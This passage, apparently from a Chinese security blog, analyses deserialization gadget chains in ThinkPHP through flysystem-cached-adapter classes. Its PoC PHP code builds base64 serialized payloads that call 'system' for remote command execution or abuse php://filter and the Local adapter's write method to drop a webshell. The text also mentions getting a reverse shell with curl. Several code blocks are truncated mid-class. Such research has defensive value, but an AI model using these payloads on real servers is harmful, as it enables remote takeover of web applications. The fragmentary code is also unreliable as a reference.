        {
            protected $store;
            protected $expire;
            protected $key;
            public function __construct()
            {
                $this->store = new File();
                $this->expire = 1;
                $this->key = '1';
            }
        }
        echo base64_encode(serialize(new CacheStore()));
    }
    namespace think\cache {
        use think\model\Pivot;
        abstract class Driver
        {
            protected $options = [
                'expire' => 0,
                'cache_subdir' => true,
                'prefix' => '',
                'path' => '',
                'hash_type' => 'md5',
                'data_compress' => false,
                'tag_prefix' => 'tag:',
                'serialize' => ['system'],
            ];
            public function __construct()
            {
                $this->options = [
                    'expire' => 0,
                    'cache_subdir' => true,
                    'prefix' => '',
                    'path' => new Pivot(),
                    'hash_type' => 'md5',
                    'data_compress' => false,
                    'tag_prefix' => 'tag:',
                    'serialize' => ['system'],
                ];
            }
        }
    }
    namespace think\cache\driver {
        use think\cache\Driver;
        class File extends Driver
        {
        }
    }
    namespace think {
        use think\model\concern\Attribute;
        abstract class Model
        {
            private $data = [];
            private $withAttr = [];
            public function __construct()
            {
                $this->data = ['key' => 'whoami'];
                $this->visible = ["key" => 1];
                $this->withAttr = ['key' => 'system'];
            }
        }
    }
    namespace think\model\concern {
        trait Attribute
        {
        }
    }
    namespace think\model {
        use think\Model;
        class Pivot extends Model
        {
        }
    }
## 第三条链子
###  漏洞分析
回到上一条链子的set方法
当我们退出getCacheKey后往下面走会进入一个serialize方法
跟进serialize
这里的`$this->options['serialize']`可控,绕过$data的值可控的话就可以去RCE
回到前面可控$data怎么来的
serialize方法的参数值是set方法的$value
继续回溯到set方法前面的save方法看看$value是如何来的
是$content的值,跟进getForStorage()
返回一个json格式的数据
所以这里$data是一个被处理后的json数据,不过system函数能够处理json数据
不过这里只有linux系统适用,因为反引号在window不起作用
###  漏洞复现
poc
    store = $store;
            }
        }
    }
    namespace think\cache {
        abstract class Driver
        {
            protected $options = [
                'expire' => 0,
                'cache_subdir' => true,
                'prefix' => '',
                'path' => '',
                'hash_type' => 'md5',
                'data_compress' => false,
                'tag_prefix' => 'tag:',
                'serialize' => ['system'],
            ];
        }
    }
    namespace think\cache\driver {
        use think\cache\Driver;
        class File extends Driver
        {
        }
    }
    namespace {
        $file = new think\cache\driver\File();
        $cache = new think\filesystem\CacheStore($file);
        echo base64_encode(serialize($cache));
    }
这里执行命令虽然不知道为什么没有回显，但是可以curl去反弹shell
bash并没有反弹成功
成功反弹shell
    store = new File();
            }
        }
        echo base64_encode(serialize(new CacheStore()));
    }
    namespace think\cache {
        abstract class Driver
        {
        }
    }
    namespace think\cache\driver {
        use think\cache\Driver;
        class File extends Driver
        {
            protected $options = [
                'expire'        => 0,
                'cache_subdir'  => true,
                'prefix'        => '',
                'path'          => '',
                'hash_type'     => 'md5',
                'data_compress' => false,
                'tag_prefix'    => 'tag:',
                'serialize'     => ['system'],
            ];
        }
    }
## 第四条链子
###  漏洞分析
继续回到set方法往下走
发现一个file_put_contents函数
$filename是getCacheKey()的返回值
跟进getCacheKey()
`$this->options['path']`和$name都是可控的,那文件名就可控了
然后就直接让`$this->options['hash_type']`为md5,`$this->options['path']`为filter过滤器,$name=1
文件名就是1的md5编码了
两个if可以控制参数不进入即可
文件名可控了,再回过头来看$data的值
serialize方法返回了第一个$data的值,跟进serialize方法
第三条链子已经提到了这么去控制这个返回值了,所以这里返回值也是可控的
不过$serialize的值需要是一个函数,并且不影响$data的值,这里可以用trim函数
可以看看效果
    store = new File();
            }
        }
        echo base64_encode(serialize(new CacheStore()));
    }
    namespace think\cache {
        abstract class Driver
        {
        }
    }
    namespace think\cache\driver {
        use think\cache\Driver;
        class File extends Driver
        {
            protected $options = [
                'expire'        => 1,
                'cache_subdir'  => false,
                'prefix'        => false,
                'path'          => 'php://filter/write=convert.base64-decode/resource=',
                'hash_type'     => 'md5',
                'data_compress' => false,
                'tag_prefix'    => 'tag:',
                'serialize'     => ['trim']
            ];
        }
    }
写入了文件,在public目录下
## 第五条链子
###  漏洞分析
入口点还是
    vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php
之前提到过,这是一个抽象类,他有几个子类对这个save方法进行了重写
之前我们找的是这下面的save方法
再看看其他的save方法,定位到src/Storage/Adapter.php
$this->file是可控的,$contents是getForStorage方法的返回值
跟进看看
和之前的有点类似,返回一个json格式的数组
这里可以去想办法去找到可用的call方法 ,或者可用的has方法
还有一种,就是找到一个类同时存在has方法和可用的update方法和write方法
定位到src/Adapter/Local.php
同时存在以上三个方法
看has方法
    public function has($path)
    {
        $location = $this->applyPathPrefix($path);
        return file_exists($location);
    }
判断文件是否存在
跟进applyPathPrefix
跟进getPathPrefix
直接返回一个可控值$this->pathPrefix
如果$this->pathPrefix为空,applyPathPrefix的返回值就是$path
$path是之前可控的$this->file
这里只有构建一个不存在的文件名即可进入save方法的if
跟进write
有一个file_put_contents
$location的值和刚才一样已经分析过了
然后进入if判断，$content的值也是可控的,这里就可以用来写文件
占尽天时地利人和,下一步就是写马了
###  漏洞复现
    '];
    }
    namespace League\Flysystem\Cached\Storage;
    class Adapter extends AbstractCache
    {
        protected $adapter;
        protected $file;
        public function __construct($obj)
        {
            $this->adapter = $obj;
            $this->file = 'DawnT0wn.php';
        }
    }
    namespace League\Flysystem\Adapter;
    abstract class AbstractAdapter
    {
    }
    namespace League\Flysystem\Adapter;
    use League\Flysystem\Cached\Storage\Adapter;
    use League\Flysystem\Config;
    class Local extends AbstractAdapter
    {
        public function has($path)
        {
        }
        public function write($path, $contents, Config $config)
        {
        }
    }
    $a = new Local();
    $b = new Adapter($a);
    echo base64_encode(serialize($b));
成功写入
不过这里不能控制complete的值去写入,里面应该是会检验php标签
其实这里后半部分的gadget还在,只要找到可控的字符拼接这种类型的都可以去调用到后面的toString,在复现过程中,看到了几个地方都可以去调用toString的,不过只写了第二条链子
参考链接